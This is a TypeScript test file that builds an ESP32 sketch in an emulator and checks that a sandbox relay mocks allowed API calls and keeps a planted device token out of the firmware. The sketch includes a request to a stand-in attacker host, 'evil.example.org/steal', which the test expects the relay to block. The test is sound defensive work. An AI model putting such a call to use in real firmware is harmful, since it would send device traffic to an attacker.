// Round 13: real firmware through the relay in the simulator. A XIAO ESP32-S3 sketch written for the
// real device (FaberRelay.h, WiFi.h, HTTPClient, NetworkClientSecure with FABER_RELAY_ROOT_CA) is
// built with the real toolchain and run in Espressif's QEMU; the build adds the simulation
// faber_device.h, so the sketch calls the sandbox relay, which applies the project's allow list and
// answers from a mock. A person's own faber_device.h in the folder is never compiled.
// Needs the native ESP32 toolchain + QEMU (faber setup esp32) or Docker; skipped otherwise.
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { canBuildArduino } from "@faber/runner";
import { qemuImageAvailable } from "@faber/sim-backends/node";
import { ProjectSession } from "../src/index.ts";

const ready = qemuImageAvailable() && canBuildArduino("esp32:esp32:XIAO_ESP32S3").ok;
if (!ready) console.warn("skipping the relay firmware test: the ESP32 toolchain and QEMU are not ready (Fix: pnpm faber setup esp32)");

const SKETCH = `// Any API through the project's relay: no key in this file.
#include <WiFi.h>
#include <HTTPClient.h>
#include <NetworkClientSecure.h>
#include "FaberRelay.h"

NetworkClientSecure client;

int call(const char* host, const char* path, const char* body) {
  HTTPClient http;
  http.begin(client, faberRelayUrl(host, path));
  http.addHeader(FABER_TOKEN_HEADER, FABER_DEVICE_TOKEN);
  http.addHeader("Content-Type", "application/json");
  int code = body ? http.POST(body) : http.GET();
  String text = code > 0 ? http.getString() : String("");
  Serial.printf("%s %d %s\\n", host, code, text.c_str());
  http.end();
  return code;
}

void setup() {
  Serial.begin(115200);
  delay(200);
  if (!faberRelayReady()) {
    Serial.println(faberRelayWhy());
    return;
  }
  Serial.printf("relay %s\\n", FABER_RELAY_URL);
  WiFi.begin(FABER_WIFI_SSID, FABER_WIFI_PASSWORD);
  for (int i = 0; i < 100 && WiFi.status() != WL_CONNECTED; i++) delay(100);
  Serial.printf("wifi %d\\n", WiFi.status());
  client.setCACert(FABER_RELAY_ROOT_CA);
  call("api.example.com", "/v1/comment", "{\\"seen\\":\\"a cat on a keyboard\\"}");
  call("evil.example.org", "/steal", nullptr);
  Serial.println("done");
}

void loop() { delay(50); }
`;

const call = (s: ProjectSession, op: string, args: Record<string, unknown> = {}) => s.call(op, args) as Promise<Record<string, any>>;

describe.skipIf(!ready)("firmware through the sandbox relay (real build, real QEMU)", { timeout: 600_000 }, () => {
  const dir = mkdtempSync(join(tmpdir(), "faber-relay-fw-"));
  const s = new ProjectSession({ dir, actor: "test" });
  afterAll(() => {
    s.dispose();
    rmSync(dir, { recursive: true, force: true });
  });

  it("builds without the person's faber_device.h and gets the mocked answer through the relay; a host off the list is refused", async () => {
    await call(s, "new_project", { template: "xiao-esp32s3" });
    await call(s, "set_network", { mode: "mock", secrets: ["API_KEY"], allow: [{ host: "api.example.com", secrets: ["API_KEY"], headers: { Authorization: "Bearer {{secret:API_KEY}}" } }] });
    await call(s, "add_mock_api", { mock: { host: "api.example.com", method: "POST", path: "/v1/comment", response: { body: { say: "nice keyboard, cat" } } } });
    await call(s, "write_file", { path: "firmware/main.ino", content: SKETCH });
    // the person's real settings are in the folder: Faber's builds must ignore them
    writeFileSync(join(dir, "firmware", "faber_device.h"), '#define FABER_RELAY_URL "https://real-relay.example"\n#define FABER_DEVICE_TOKEN "jdt_REAL_TOKEN_MUST_NOT_SHIP"\n');
    const b = await call(s, "build");
    expect(b.ok, JSON.stringify(b)).toBe(true);
    const bin = readFileSync(join(dir, "firmware/main.bin"));
    expect(bin.includes(Buffer.from("jdt_REAL_TOKEN_MUST_NOT_SHIP"))).toBe(false);
    expect(bin.includes(Buffer.from("https://relay.sandbox.faber"))).toBe(true);
    const r = await call(s, "run", { ms: 12000 });
    const serial = String(r.serial ?? "");
    expect(serial, serial).toContain("relay https://relay.sandbox.faber");
    expect(serial, serial).toContain('api.example.com 200 {"say":"nice keyboard, cat"}');
    expect(serial, serial).toMatch(/evil\.example\.org 403 \{"error":"host-not-allowed"/);
    const net = await call(s, "read_network", {});
    const entries = (net.entries ?? net.log ?? []) as Array<Record<string, unknown>>;
    expect(entries.some((e) => e.kind === "http" && e.via === "relay" && e.host === "api.example.com" && e.status === 200 && e.source === "mock"), JSON.stringify(entries.slice(-12))).toBe(true);
    expect(entries.some((e) => e.via === "relay" && e.status === 403)).toBe(true);
  });

  it("the device build (factory pack / kit) has no relay settings at all", async () => {
    const dev = await s.deviceFirmware();
    expect("data" in dev, JSON.stringify(dev)).toBe(true);
    if (!("data" in dev)) return;
    const img = Buffer.from(dev.data as Uint8Array);
    expect(img.includes(Buffer.from("jdt_REAL_TOKEN_MUST_NOT_SHIP"))).toBe(false);
    expect(img.includes(Buffer.from("relay.sandbox.faber"))).toBe(false);
    expect(img.includes(Buffer.from("no relay in this build"))).toBe(true);
    expect(existsSync(join(dir, "firmware", "faber_device.h"))).toBe(true);
  });
});
